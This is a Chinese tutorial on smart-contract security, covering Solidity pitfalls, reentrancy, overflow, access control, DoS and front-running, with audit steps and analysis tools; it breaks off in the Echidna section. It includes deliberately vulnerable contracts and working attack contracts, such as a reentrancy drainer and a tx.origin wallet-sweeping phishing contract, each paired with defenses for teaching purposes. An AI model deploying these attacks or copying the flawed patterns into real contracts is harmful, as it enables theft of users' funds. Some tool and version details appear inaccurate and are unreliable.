# 智能合约安全

> 本文档详细介绍智能合约安全相关知识，包括 Solidity 基础、常见漏洞类型、攻击原理、防御方法以及安全审计工具。

---

## 一、Solidity 基础与常见陷阱

### 1.1 Solidity 简介

Solidity 是以太坊智能合约的主要编程语言，语法类似于 JavaScript/C++，是一种静态类型、面向对象的高级语言。

**特点：**
- 运行在 EVM（以太坊虚拟机）上
- 静态类型语言，编译为字节码
- 支持继承、库、接口等面向对象特性
- 内置加密函数和区块链相关全局变量

### 1.2 数据类型与注意事项

#### 1.2.1 整数类型

```solidity
// 有符号整数：int8 ~ int256（步长 8）
int8  public a = -128;     // 范围：-128 ~ 127
int256 public b = 100;     // 范围：-2^255 ~ 2^255-1

// 无符号整数：uint8 ~ uint256（步长 8）
uint8  public c = 255;     // 范围：0 ~ 255
uint256 public d = 100;    // 范围：0 ~ 2^256-1

// uint 是 uint256 的别名
uint public e = 100;       // 等同于 uint256
```

**⚠️ 常见陷阱：**
- Solidity 0.8 之前的版本，整数溢出不会报错，会静默回绕
- 不同类型的整数运算可能导致隐式转换问题
- 使用 `uint` 时注意不能为负数

#### 1.2.2 地址类型

```solidity
address public owner;           // 20 字节地址
address payable public receiver; // 可接收 ETH 的地址

// 地址类型的成员
// - balance：地址的 ETH 余额（单位：wei）
// - transfer(amount)：发送 ETH，失败则抛出异常（2300 gas）
// - send(amount)：发送 ETH，失败返回 bool（2300 gas）
// - call(...)：底层调用，返回 (bool, bytes)（转发所有 gas）
// - delegatecall(...)：委托调用，使用调用者的上下文
// - staticcall(...)：静态调用，不修改状态
```

**⚠️ 常见陷阱：**
- `transfer` 和 `send` 只有 2300 gas，接收方如果 fallback 函数复杂会失败
- `call` 会转发所有 gas，可能导致重入攻击
- 地址和合约地址无法在编译时区分
- 向非 payable 地址发送 ETH 会失败

#### 1.2.3 映射（Mapping）

```solidity
mapping(address => uint256) public balances;
mapping(address => mapping(address => uint256)) public allowance;

// 特点：
// 1. 无法遍历所有 key
// 2. 不存在的 key 返回默认值（0/false/空地址）
// 3. 不能作为返回值（外部函数）
// 4. 存储在 storage 中
```

**⚠️ 常见陷阱：**
- 无法判断一个 key 是否存在（因为默认值就是 0）
- 不能获取 mapping 的长度
- 无法删除整个 mapping

### 1.3 函数可见性

```solidity
// public：内部外部都可调用
function publicFunc() public { }

// external：只能从外部调用（合约内部不能直接调用，需用 this.调用）
function externalFunc() external { }

// internal：只能在当前合约和继承合约中调用
function internalFunc() internal { }

// private：只能在当前合约中调用
function privateFunc() private { }
```

**⚠️ 常见陷阱：**
- 默认可见性是 `public`（旧版本），显式声明更安全
- `external` 比 `public` 更省 gas（因为不需要复制参数到内存）
- 敏感函数不能设为 `public` 或 `external` 而不加权限控制

### 1.4 存储位置

```solidity
// storage：存储在区块链上，永久保存（状态变量）
uint256 public storedData;  // storage

// memory：函数执行时的临时内存，执行完即销毁
function test(uint256[] memory array) public pure {
    uint256[] memory tempArray = new uint256[](10);  // memory
}

// calldata：只读的函数参数存储（external 函数的参数）
function test(uint256[] calldata array) external pure {
    // array 是只读的，不能修改
}

// stack：EVM 栈上的局部变量（值类型）
```

**⚠️ 常见陷阱：**
- storage 引用可能意外覆盖状态变量
- memory 数组不能直接赋值给 storage 数组
- 复杂类型的存储位置容易混淆

### 1.5 特殊全局变量

```solidity
// 区块相关
block.number       // 当前区块高度
block.timestamp    // 当前区块时间戳（秒）
block.difficulty   // 区块难度
block.gaslimit     // 区块 gas 限制
block.coinbase     // 矿工地址
blockhash(uint n)  // 第 n 个区块的哈希（最近 256 个区块）

// 交易相关
msg.sender         // 消息发送者（直接调用者）
msg.value          // 发送的 ETH 数量（wei）
msg.data           // 完整的 calldata
msg.sig            // 函数选择器（前 4 字节）
tx.origin          // 交易的原始发送者（整个调用链的起点）
tx.gasprice        // 交易的 gas 价格

// 其他
address(this)      // 当前合约地址
this.balance       // 当前合约余额（同 address(this).balance）
gasleft()          // 剩余 gas
```

**⚠️ 常见陷阱：**
- 不要用 `block.timestamp` 做随机数或关键时间判断（矿工可操纵）
- 不要用 `tx.origin` 做权限验证（可能被钓鱼攻击）
- `msg.sender` 是直接调用者，不是交易发起者

### 1.6 Solidity 版本差异

| 版本 | 重要变化 |
|------|---------|
| **0.4.x** | 早期版本，函数可见性默认 public |
| **0.5.0** | 明确要求函数可见性声明；引入 calldata 位置 |
| **0.6.0** | 引入 try/catch；引入 virtual/override |
| **0.7.0** | 移除 NatSpec 注释校验；调整全局变量 |
| **0.8.0** | 内置整数溢出/下溢检查（默认 revert）；引入 custom error |
| **0.8.4** | 引入自定义错误（custom error）更省 gas |
| **0.8.7** | 引入 block.basefee（EIP-1559） |

**注意：** Solidity 0.8 之前整数溢出是静默的，需要使用 SafeMath 库。0.8 及以后版本内置溢出检查，溢出会 revert。

## 二、重入攻击（Reentrancy）

### 2.1 漏洞原理

重入攻击是最经典的智能合约漏洞之一。当合约在发送 ETH（或调用外部合约）之后才更新状态时，攻击者可以在外部调用中再次进入合约函数，利用状态尚未更新的漏洞重复提取资金。

**攻击图示：**

```
正常流程：
  检查余额 → 扣减余额 → 发送 ETH

漏洞流程（重入攻击）：
  检查余额 → 发送 ETH → [攻击者 fallback 再次调用 withdraw] → 检查余额 → 发送 ETH → ... → 扣减余额
                            ↑___________________________________________________________|
```

### 2.2 漏洞代码示例

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// ⚠️ 存在重入漏洞的合约
contract VulnerableBank {
    mapping(address => uint256) public balances;

    // 存款
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 提款函数 - 存在重入漏洞！
    function withdraw(uint256 _amount) public {
        // 1. 检查余额
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // 2. 发送 ETH（先转账！）
        // call 会转发所有 gas 给接收方
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");

        // 3. 扣减余额（后更新状态！）
        // 攻击者在第 2 步又调用了 withdraw，余额还没扣减
        balances[msg.sender] -= _amount;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

### 2.3 攻击合约

```solidity
// 攻击者合约
contract ReentrancyAttacker {
    VulnerableBank public vulnerableBank;

    constructor(address _bankAddress) public {
        vulnerableBank = VulnerableBank(_bankAddress);
    }

    // 攻击入口：先存款，再提款触发重入
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        
        // 1. 先存入一些 ETH
        vulnerableBank.deposit{value: msg.value}();
        
        // 2. 第一次提款，触发 fallback 中的递归提款
        vulnerableBank.withdraw(msg.value);
    }

    // fallback 函数：收到 ETH 时自动调用
    receive() external payable {
        // 如果银行合约还有钱，继续提款
        if (address(vulnerableBank).balance >= msg.value) {
            vulnerableBank.withdraw(msg.value);
        }
    }

    // 提取攻击所得
    function withdrawStolenFunds() external {
        msg.sender.transfer(address(this).balance);
    }
}
```

### 2.4 攻击步骤详解

```
步骤 1：攻击者部署攻击合约，存入 1 ETH
  → 攻击者余额 = 1 ETH
  → 银行合约余额 = 1 ETH

步骤 2：调用 withdraw(1 ETH)
  → 检查余额：1 ETH >= 1 ETH ✓
  → 发送 1 ETH 给攻击合约
  → 攻击合约的 receive() 被触发

步骤 3：receive() 中再次调用 withdraw(1 ETH)
  → 检查余额：1 ETH >= 1 ETH ✓ （余额还没扣减！）
  → 发送 1 ETH 给攻击合约
  → receive() 再次被触发

步骤 4：递归重复步骤 3
  → 直到银行合约余额不足或 gas 耗尽

步骤 5：最后一层调用返回
  → 扣减余额：balances[attacker] = 0
  → 逐层返回，每次都扣减余额
  → 但攻击者已经提走了远超其存款的资金
```

### 2.5 防御方法

#### 方法一：检查-生效-交互模式（Checks-Effects-Interactions）

**原则：** 先做所有检查，然后更新所有状态，最后才与外部合约交互。

```solidity
function withdraw(uint256 _amount) public {
    // 1. 检查（Checks）
    require(balances[msg.sender] >= _amount, "Insufficient balance");

    // 2. 生效（Effects）- 先更新状态！
    balances[msg.sender] -= _amount;

    // 3. 交互（Interactions）- 最后才转账
    (bool success, ) = msg.sender.call{value: _amount}("");
    require(success, "Transfer failed");
}
```

#### 方法二：重入锁（Reentrancy Guard）

使用 OpenZeppelin 的 `ReentrancyGuard`：

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureBank is ReentrancyGuard {
    mapping(address => uint256) public balances;

    // 使用 nonReentrant 修饰符
    function withdraw(uint256 _amount) public nonReentrant {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        balances[msg.sender] -= _amount;
        
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
    }
}
```

**重入锁原理：**
```solidity
contract ReentrancyGuard {
    bool private _locked;

    modifier nonReentrant() {
        require(!_locked, "Reentrant call");
        _locked = true;
        _;
        _locked = false;
    }
}
```

#### 方法三：Pull 模式（让用户主动提取）

```solidity
// Push 模式（不安全）：合约主动给用户转账
function withdrawPush() public {
    msg.sender.call{value: balances[msg.sender]}("");
    balances[msg.sender] = 0;
}

// Pull 模式（安全）：先记录欠款，用户自己 claim
mapping(address => uint256) public pendingWithdrawals;

function withdraw() public {
    uint256 amount = balances[msg.sender];
    require(amount > 0);
    
    balances[msg.sender] = 0;
    pendingWithdrawals[msg.sender] = amount;
}

function claimWithdrawal() public {
    uint256 amount = pendingWithdrawals[msg.sender];
    pendingWithdrawals[msg.sender] = 0;
    msg.sender.call{value: amount}("");
}
```

### 2.6 真实案例：The DAO 攻击

- **时间**：2016 年 6 月
- **损失**：约 360 万 ETH
- **原因**：`splitDAO` 函数存在重入漏洞
- **结果**：以太坊硬分叉为 ETH 和 ETC

## 三、整数溢出/下溢

### 3.1 漏洞原理

当整数运算的结果超出了数据类型所能表示的范围时，就会发生溢出（overflow）或下溢（underflow）。

**示例（uint8）：**
```
范围：0 ~ 255

溢出：255 + 1 = 0    （绕回最小值）
下溢：0 - 1 = 255    （绕回最大值）
```

### 3.2 漏洞代码示例

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;  // 0.8 之前不会自动检查溢出

// ⚠️ 存在整数溢出漏洞的代币合约
contract VulnerableToken {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        totalSupply = _initialSupply;
        balanceOf[msg.sender] = _initialSupply;
    }

    // 转账函数 - 存在溢出漏洞！
    function transfer(address _to, uint256 _value) public returns (bool) {
        // 没有检查余额是否足够
        // 如果 balanceOf[msg.sender] = 100，_value = 200
        // balanceOf[msg.sender] - _value = 2^256 - 100（下溢！变成一个巨大的数）
        
        balanceOf[msg.sender] -= _value;  // 下溢！
        balanceOf[_to] += _value;
        
        return true;
    }
}
```

**攻击过程：**
```
攻击者余额 = 100 代币
调用 transfer(attacker2, 200)

balanceOf[msg.sender] = 100 - 200 = 2^256 - 100  （下溢！变成超级大的数）
balanceOf[attacker2] = 0 + 200 = 200

结果：攻击者凭空获得了几乎无限的代币！
```

### 3.3 另一个溢出漏洞：批量转账

```solidity
// ⚠️ 存在漏洞的批量转账
function batchTransfer(address[] memory _receivers, uint256 _value) public returns (bool) {
    uint256 count = _receivers.length;
    uint256 totalAmount = _value * count;  // 可能溢出！
    
    require(balanceOf[msg.sender] >= totalAmount);
    
    balanceOf[msg.sender] -= totalAmount;
    
    for (uint256 i = 0; i < count; i++) {
        balanceOf[_receivers[i]] += _value;
    }
    
    return true;
}
```

**攻击：**
```
_value = 2^255
count = 2

totalAmount = 2^255 * 2 = 0  （溢出！）

require(balanceOf[msg.sender] >= 0)  →  通过！

然后给两个地址各转 2^255 代币，而发送者只扣除了 0！
```

### 3.4 真实案例：美链 BEC 溢出

- **时间**：2018 年 4 月
- **损失**：BEC 代币几乎归零（无限增发）
- **原因**：`batchTransfer` 函数中的乘法溢出
- **漏洞代码：** `uint256 totalAmount = _value * _receivers.length;`

### 3.5 防御方法

#### 方法一：使用 SafeMath 库（Solidity 0.8 之前）

```solidity
// SafeMath 库实现
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}

// 使用 SafeMath
contract SafeToken {
    using SafeMath for uint256;
    
    mapping(address => uint256) public balanceOf;

    function transfer(address _to, uint256 _value) public returns (bool) {
        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);  // 安全减法
        balanceOf[_to] = balanceOf[_to].add(_value);                // 安全加法
        return true;
    }
}
```

#### 方法二：使用 Solidity 0.8+ 内置检查

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;  // 0.8 及以上版本内置溢出检查

contract SafeToken {
    mapping(address => uint256) public balanceOf;

    function transfer(address _to, uint256 _value) public returns (bool) {
        // Solidity 0.8+ 自动检查溢出，溢出时会 revert
        balanceOf[msg.sender] -= _value;  // 自动检查下溢
        balanceOf[_to] += _value;         // 自动检查上溢
        return true;
    }

    // 如果明确知道不会溢出，可以用 unchecked 块节省 gas
    function uncheckedAdd(uint256 a, uint256 b) public pure returns (uint256) {
        unchecked {
            return a + b;  // 不会检查溢出，更省 gas
        }
    }
}
```

#### 方法三：使用 OpenZeppelin 安全合约库

```solidity
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MyToken is ERC20 {
    constructor() ERC20("MyToken", "MTK") {
        _mint(msg.sender, 1000000 * 10**decimals());
    }
}
```

## 四、访问控制漏洞

### 4.1 漏洞原理

访问控制漏洞是指合约中某些敏感函数没有正确的权限校验，导致任何人都可以调用这些函数执行特权操作。

**常见类型：**
1. 缺少权限检查
2. 权限检查错误（如错误的地址比较）
3. 使用 `tx.origin` 进行身份验证
4. 构造函数拼写错误（旧版本中的 constructor 问题）
5. 初始化函数可被多次调用

### 4.2 缺少权限检查

```solidity
// ⚠️ 漏洞合约：任何人都可以 mint
contract VulnerableMint {
    mapping(address => uint256) public balanceOf;
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    // 任何人都可以调用 mint！没有权限检查
    function mint(address _to, uint256 _amount) public {
        balanceOf[_to] += _amount;
    }
}
```

**修复：**
```solidity
// 正确：添加 onlyOwner 修饰符
contract SafeMint {
    mapping(address => uint256) public balanceOf;
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() public {
        owner = msg.sender;
    }

    // 只有 owner 可以调用
    function mint(address _to, uint256 _amount) public onlyOwner {
        balanceOf[_to] += _amount;
    }
}
```

### 4.3 tx.origin 钓鱼攻击

**漏洞原理：** 使用 `tx.origin` 进行身份验证，攻击者可以通过诱导用户调用恶意合约来绕过验证。

```solidity
// ⚠️ 漏洞：使用 tx.origin 做权限验证
contract VulnerableWallet {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    // 危险！用 tx.origin 验证身份
    function transfer(address payable _to, uint256 _amount) public {
        require(tx.origin == owner, "Not owner");
        _to.transfer(_amount);
    }
}
```

**攻击合约：**
```solidity
contract AttackContract {
    VulnerableWallet public wallet;
    address payable public attacker;

    constructor(address _wallet) public {
        wallet = VulnerableWallet(_wallet);
        attacker = msg.sender;
    }

    // 诱导 owner 调用这个函数
    function() external payable {
        // 当 owner 向此合约发送 ETH 时
        // tx.origin 是 owner，msg.sender 是此合约
        wallet.transfer(attacker, address(wallet).balance);
    }
}
```

**攻击流程：**
```
1. 攻击者部署 AttackContract
2. 攻击者诱导钱包 owner 向 AttackContract 发送 1 wei（钓鱼）
3. owner 发送交易 → tx.origin = owner
4. AttackContract 的 fallback 被调用
5. fallback 调用 wallet.transfer(attacker, 全部余额)
6. wallet 中 tx.origin == owner → 验证通过！
7. 资金被转到攻击者地址
```

**修复：** 永远使用 `msg.sender` 而不是 `tx.origin` 进行身份验证。

```solidity
function transfer(address payable _to, uint256 _amount) public {
    require(msg.sender == owner, "Not owner");  // 正确做法
    _to.transfer(_amount);
}
```

### 4.4 初始化函数漏洞（UUPS/代理模式）

**漏洞原理：** 使用代理模式时，逻辑合约的构造函数不会在代理上下文中执行，因此需要 `initialize` 函数。如果 `initialize` 函数没有保护，任何人都可以调用。

```solidity
// ⚠️ 漏洞：初始化函数可以被任何人调用
contract VulnerableLogic {
    address public owner;
    bool public initialized;

    // 代理合约不会执行构造函数
    constructor() public {
        owner = msg.sender;  // 这行对代理合约无效！
    }

    // 初始化函数 - 没有权限检查！
    function initialize() public {
        require(!initialized, "Already initialized");
        owner = msg.sender;
        initialized = true;
    }
}
```

**修复：**
```solidity
import "@openzeppelin/contracts/proxy/utils/Initializable.sol";

contract SafeLogic is Initializable {
    address public owner;

    function initialize() public initializer {
        owner = msg.sender;
    }
}
```

### 4.5 真实案例：Parity 钱包漏洞（2017）

- **事件**：攻击者利用了 Parity 多签钱包库合约中的 `initWallet` 函数
- **原因**：库合约本身没有正确初始化，任何人都可以调用 `initWallet` 将自己设为 owner
- **损失**：约 15 万 ETH 被永久锁定（不是被盗，是无法取出）
- **结果**：Parity 紧急冻结了所有多签钱包

## 五、拒绝服务攻击（DoS）

### 5.1 漏洞原理

拒绝服务攻击是指攻击者通过某种方式使合约无法正常运行或无法被正常使用。

**常见类型：**
1. Gas 耗尽型 DoS
2. 意外回退型 DoS
3. 区块 Gas 限制型 DoS
4. 数组遍历型 DoS

### 5.2 Gas 耗尽型 DoS

**漏洞场景：** 合约在循环中调用外部合约，如果外部合约故意消耗所有 gas，会导致整个交易失败。

```solidity
// ⚠️ 漏洞：批量发奖，依赖外部调用
contract VulnerableAuction {
    address[] public winners;
    mapping(address => uint256) public rewards;

    // 给所有赢家发奖
    function distributeRewards() public {
        for (uint256 i = 0; i < winners.length; i++) {
            // 如果某个 winner 是合约，fallback 消耗所有 gas
            // 整个函数就会失败，其他人也拿不到奖励
            payable(winners[i]).transfer(rewards[winners[i]]);
        }
    }
}
```

**攻击：**
```solidity
contract MaliciousWinner {
    receive() external payable {
        // 消耗所有 gas，导致整个交易回滚
        while (true) {
            // 无限循环消耗 gas
        }
    }
}
```

**防御：Pull 模式**
```solidity
// 改为让用户主动领取
mapping(address => uint256) public pendingRewards;

function claimReward() public {
    uint256 reward = pendingRewards[msg.sender];
    pendingRewards[msg.sender] = 0;
    payable(msg.sender).transfer(reward);
}
```

### 5.3 数组遍历型 DoS

**漏洞场景：** 合约需要遍历一个不断增长的数组，当数组太大时，单次遍历超过区块 Gas Limit，导致永远无法执行完成。

```solidity
// ⚠️ 漏洞：遍历不断增长的数组
contract VulnerableRegistry {
    address[] public participants;

    function register() public {
        participants.push(msg.sender);
    }

    // 当 participants 很大时，这个函数会因为 gas 不足而永远失败
    function payAll(uint256 amount) public {
        for (uint256 i = 0; i < participants.length; i++) {
            payable(participants[i]).transfer(amount);
        }
    }
}
```

**防御：** 分批处理或使用 Pull 模式
```solidity
// 分批处理
function payBatch(uint256 start, uint256 end) public {
    require(end <= participants.length);
    for (uint256 i = start; i < end; i++) {
        // ...
    }
}
```

### 5.4 意外回退型 DoS

**漏洞场景：** 合约的关键功能依赖于向某个地址转账，如果该地址是合约且拒绝接收 ETH，关键功能会被阻塞。

```solidity
// ⚠️ 漏洞：竞拍依赖于退回押金
contract VulnerableAuction {
    address public highestBidder;
    uint256 public highestBid;

    function bid() public payable {
        require(msg.value > highestBid);

        // 退回上一个出价者的资金
        // 如果上一个出价者是恶意合约，revert 会导致没有人能超过他
        payable(highestBidder).transfer(highestBid);

        highestBidder = msg.sender;
        highestBid = msg.value;
    }
}
```

**攻击：**
```solidity
contract MaliciousBidder {
    function bid(address auction) external payable {
        VulnerableAuction(auction).bid{value: msg.value}();
    }

    // 拒绝接收 ETH，导致转账失败
    receive() external payable {
        revert("I don't accept ETH");
    }
}
```

**防御：Pull 模式**
```solidity
contract SafeAuction {
    address public highestBidder;
    uint256 public highestBid;
    mapping(address => uint256) public pendingReturns;

    function bid() public payable {
        require(msg.value > highestBid);

        // 记录退款，不立即转账
        pendingReturns[highestBidder] += highestBid;

        highestBidder = msg.sender;
        highestBid = msg.value;
    }

    // 用户自己提取
    function withdraw() public {
        uint256 amount = pendingReturns[msg.sender];
        pendingReturns[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
    }
}
```

## 六、前置交易（Front-running）

### 6.1 漏洞原理

前置交易（又称抢跑交易）是指攻击者观察到交易池（mempool）中的有利可图的交易后，以更高的 Gas 价格发送一笔类似的交易，使其被优先打包，从而抢占利益。

**攻击图示：**

```
交易池（Mempool）中的交易：
  1. 用户 A：以 100 USDC 购买 1 ETH（Gas Price: 1 gwei）← 攻击者观察到
  2. 攻击者：以 100 USDC 购买 1 ETH（Gas Price: 100 gwei）← 抢先提交

矿工按 Gas Price 排序打包：
  区块中：[攻击者的交易] → [用户 A 的交易]
  
结果：攻击者先买到了 ETH，价格被推高，用户 A 买到更贵的 ETH
```

### 6.2 常见攻击场景

#### 6.2.1 DEX 抢跑

攻击者在 Uniswap 等 DEX 上观察到大额交易，抢先买入推高价格，再卖给后来的交易者。

```
1. 攻击者监控 mempool，发现大额买单
2. 攻击者用更高 gas 抢先买入
3. 大额买单成交，价格上涨
4. 攻击者卖出获利
```

#### 6.2.2 三明治攻击（Sandwich Attack）

```
攻击前价格：1 ETH = 1000 USDC

1. 攻击者观察到大额买单（100 ETH）
2. 攻击者先买入 10 ETH → 价格涨到 1 ETH = 1050 USDC
3. 受害者买单成交 → 价格涨到 1 ETH = 1100 USDC
4. 攻击者卖出 10 ETH → 获利约 50 USDC
```

### 6.3 防御方法

#### 方法一：提交-揭示方案（Commit-Reveal）

```solidity
contract CommitReveal {
    mapping(address => bytes32) public commits;
    mapping(address => uint256) public revealedValues;

    // 阶段 1：提交哈希
    function commit(bytes32 _hash) public {
        commits[msg.sender] = _hash;
    }

    // 阶段 2：揭示原值
    function reveal(uint256 _value, string memory _salt) public {
        bytes32 hash = keccak256(abi.encodePacked(_value, _salt));
        require(hash == commits[msg.sender], "Invalid reveal");
        revealedValues[msg.sender] = _value;
    }
}
```

#### 方法二：私有交易池（Private Mempool）

- 使用 Flashbots 等私有交易池
- 交易不公开广播，直接发送给矿工

#### 方法三：限价与滑点保护

```solidity
// Uniswap V2 的滑点保护
function swap(uint256 amountOutMin) public {
    // 要求最少得到 amountOutMin 数量的代币
    // 如果价格滑点太大，交易失败
    uint256 amountOut = getAmountOut();
    require(amountOut >= amountOutMin, "Slippage too high");
}
```

#### 方法四：批量处理

使用 TWAP（时间加权平均价格）或批量结算，减少单笔交易对价格的影响。

## 七、逻辑漏洞

### 7.1 漏洞原理

逻辑漏洞是指合约的业务逻辑设计存在缺陷，导致攻击者可以利用正常的操作流程获取不当利益。这类漏洞往往最隐蔽，也最容易造成重大损失。

**常见类型：**
1. 价格预言机操纵
2. 闪电贷攻击
3. 治理攻击
4. 权限绕过
5. 业务逻辑错误

### 7.2 价格预言机操纵

**漏洞原理：** DeFi 协议使用链上 DEX（如 Uniswap）作为价格预言机，攻击者可以通过大额交易操纵价格。

```solidity
// ⚠️ 漏洞：直接用 Uniswap 现货价格作为清算价格
contract VulnerableLending {
    IUniswapV2Pair public pair;  // ETH/USDC 交易对

    function getEthPrice() public view returns (uint256) {
        // 直接从 Uniswap 读取现货价格
        // 攻击者可以用大额交易瞬间操纵这个价格
        (uint256 reserve0, uint256 reserve1, ) = pair.getReserves();
        return reserve1 / reserve0;  // USDC per ETH
    }

    function liquidate(address user) public {
        uint256 ethPrice = getEthPrice();
        // 根据价格判断是否可以清算
        // 如果价格被操纵，可能导致错误清算
        // ...
    }
}
```

**防御：** 使用 TWAP（时间加权平均价格）

```solidity
// 使用 Uniswap V2 的 TWAP 预言机
function getEthPriceTWAP() public view returns (uint256) {
    // 读取过去一段时间的平均价格
    // 单次大额交易对平均价格影响有限
    // ...
}
```

### 7.3 闪电贷攻击

**原理：** 闪电贷允许在同一笔交易中无抵押借贷，利用交易的原子性（要么全部成功，要么全部回滚）。

**攻击模式：**
```
1. 从闪电贷池借出大量资金
2. 利用资金操纵价格/进行攻击
3. 归还闪电贷本金 + 利息
4. 剩余利润归攻击者所有
```

**典型案例：bZx 攻击（2020）**
- 利用闪电贷借出资金
- 在不同交易所之间操纵价格
- 进行错误的清算获利

### 7.4 治理攻击

**漏洞原理：** 攻击者通过大量获取治理代币，控制投票来执行恶意提案。

**攻击方式：**
1. 借大量治理代币（闪电贷）
2. 提交恶意提案并投票
3. 执行提案窃取资金
4. 归还代币

**防御：**
- 投票锁定（投票需要锁仓一段时间）
- 延迟执行（提案通过后延迟执行）
- 时间锁（Timelock）

## 八、合约安全审计方法

### 8.1 审计流程

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│  1. 需求了解  │ → │  2. 代码审查  │ → │  3. 漏洞发现  │
└─────────────┘    └─────────────┘    └──────┬──────┘
                                              ↓
┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│  6. 最终报告  │ ← │  5. 修复验证  │ ← │  4. 漏洞验证  │
└─────────────┘    └─────────────┘    └─────────────┘
```

#### 8.1.1 需求了解阶段

- 阅读项目白皮书和技术文档
- 理解项目的业务逻辑和设计意图
- 明确核心功能和风险点
- 与开发团队沟通确认需求

#### 8.1.2 代码审查阶段

- 整体架构分析
- 逐行代码审查
- 关注关键函数和敏感操作
- 检查权限控制、数学运算、外部调用等

#### 8.1.3 漏洞发现阶段

- 人工代码审查
- 自动化工具扫描
- 已知漏洞模式匹配
- 逻辑漏洞分析

#### 8.1.4 漏洞验证阶段

- 编写 PoC（概念验证）代码
- 在测试环境中复现漏洞
- 确认漏洞的影响范围
- 评估漏洞严重程度

#### 8.1.5 修复验证阶段

- 审核开发团队的修复方案
- 验证修复是否彻底
- 检查是否引入新的漏洞

#### 8.1.6 最终报告阶段

- 撰写详细审计报告
- 列出所有发现的问题
- 给出修复建议
- 给出整体安全评估

### 8.2 审计关注点清单

| 类别 | 检查项 |
|------|--------|
| **权限控制** | 敏感函数是否有权限检查、权限检查是否正确、是否使用 tx.origin |
| **数学运算** | 是否有溢出风险、除法精度问题、舍入方向是否正确 |
| **外部调用** | 是否检查返回值、是否有重入风险、调用顺序是否正确 |
| **状态更新** | 是否遵循 Checks-Effects-Interactions 模式 |
| **Gas 安全** | 是否有循环依赖、是否可能超出 Gas Limit |
| **时间依赖** | 是否依赖 block.timestamp、是否可被矿工操纵 |
| **随机性** | 链上随机数是否可预测、是否使用安全的随机源 |
| **代币标准** | 是否符合 ERC20/ERC721 标准、是否有特殊行为 |
| **代理模式** | 初始化是否安全、升级是否有权限控制、存储槽是否冲突 |
| **签名验证** | 签名是否正确验证、是否有重放保护、是否检查零地址 |
| **事件日志** | 关键操作是否有事件、事件参数是否完整 |
| **代码质量** | 代码是否清晰、是否有注释、是否有未使用的代码 |

## 九、安全工具介绍

### 9.1 Mythril

**类型：** 符号执行工具

**简介：** Mythril 是一个使用符号执行技术分析 EVM 字节码的安全分析工具，可以检测重入、整数溢出、未检查调用等多种漏洞。

**安装：**
```bash
pip install mythril
```

**常用命令：**
```bash
# 分析本地合约文件
myth analyze ./contracts/MyContract.sol

# 分析已部署的合约
myth analyze -a 0xContractAddress --rpc-infura mainnet

# 输出详细报告
myth analyze MyContract.sol -v4

# 指定要检测的漏洞类型
myth analyze MyContract.sol --solv 0.8.0 -t 3
```

**检测能力：**
- 整数溢出/下溢
- 重入攻击
- 未检查返回值
- 交易顺序依赖
- 时间戳依赖
- 断言失败
- 等等

### 9.2 Slither

**类型：** 静态分析工具

**简介：** Slither 是一个基于 Python 的 Solidity 静态分析框架，可以直接分析 Solidity 源代码，检测常见的安全问题和代码质量问题。

**安装：**
```bash
pip install slither-analyzer
```

**常用命令：**
```bash
# 基本分析
slither .

# 检测特定类型的漏洞
slither . --detect reentrancy
slither . --detect pragma
slither . --exclude naming-convention

# 输出 JSON 格式
slither . --json report.json

# 打印合约继承关系
slither . --print inheritance

# 打印函数摘要
slither . --print function-summary
```

**特点：**
- 速度快，直接分析源代码
- 可扩展性强，支持自定义检测器
- 提供丰富的代码分析信息
- 集成到 CI/CD 流程方便

**常用检测器：**
| 检测器 | 说明 |
|--------|------|
| `reentrancy` | 重入攻击 |
| `reentrancy-eth` | ETH 重入 |
| `reentrancy-no-eth` | 非 ETH 重入 |
| `overflow` | 整数溢出（0.8 以下版本） |
| `unchecked-lowlevel` | 未检查底层调用 |
| `unchecked-send` | 未检查 send 返回值 |
| `tx-origin` | tx.origin 滥用 |
| `assembly` | 内联汇编使用 |
| `naming-convention` | 命名规范检查 |

### 9.3 Oyente

**类型：** 符号执行工具

**简介：** Oyente 是一个较早的智能合约安全分析工具，基于符号执行技术，可以检测常见的安全漏洞。

**安装：**
```bash
# 需要从源码安装
git clone https://github.com/melonproject/oyente.git
```

**检测能力：**
- 重入攻击
- 交易顺序依赖
- 时间戳依赖
- 断言失败

**注意：** Oyente 开发活跃度较低，推荐使用 Mythril 或 Slither。

### 9.4 Manticore

**类型：** 符号执行工具

**简介：** Manticore 是 Trail of Bits 开发的二进制分析工具，支持 EVM 和 x86/ARM 二进制文件的符号执行。

**特点：**
- 功能强大，可深度分析
- 支持生成输入以触发特定代码路径
- 可编程的分析接口

### 9.5 Echidna

**类型：** 模糊测试（Fuzzing）工具

**简介：** Echidna 是基于属性的模糊测试工具，通过生成大量随机输入来测试合约的不变量（invariants）是否成立。

**工作原理：**
